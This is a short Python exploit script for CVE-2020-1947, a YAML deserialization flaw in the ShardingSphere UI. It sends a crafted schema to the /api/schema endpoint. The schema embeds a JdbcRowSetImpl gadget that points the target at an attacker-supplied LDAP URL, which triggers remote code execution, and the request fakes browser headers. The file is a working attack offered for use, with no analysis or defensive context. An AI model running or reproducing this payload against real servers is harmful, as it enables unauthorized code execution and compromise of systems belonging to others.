#!/usr/bin python3
import requests
import argparse
import json

parse = argparse.ArgumentParser()
parse.add_argument('-i', '--ip', help='ip')
parse.add_argument('-p', '--port', default='8088', help='port')
parse.add_argument('-T', '--AccessToken',  help='HTTP Access-Token')
parse.add_argument('-poc', '--poc', help='ldap://127.0.0.1:1389/CommandObject')
args = parse.parse_args()

Origin = "http://"+args.ip+":"+args.port

headers = {
    "Host": args.ip,
    "Referer": "https://baidu.com/",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json;charset=utf-8",
    "Access-Token": args.AccessToken,
    "Origin": Origin,
    "Connection": "close"
}

url = "http://"+args.ip+":"+args.port+"/api/schema"
form_data = {"name":"CVE-2020-1947","ruleConfiguration":"  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5","dataSourceConfiguration":"!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: "+args.poc+"\n  autoCommit: true"}
results = requests.post(url, data=json.dumps(form_data), headers=headers).text

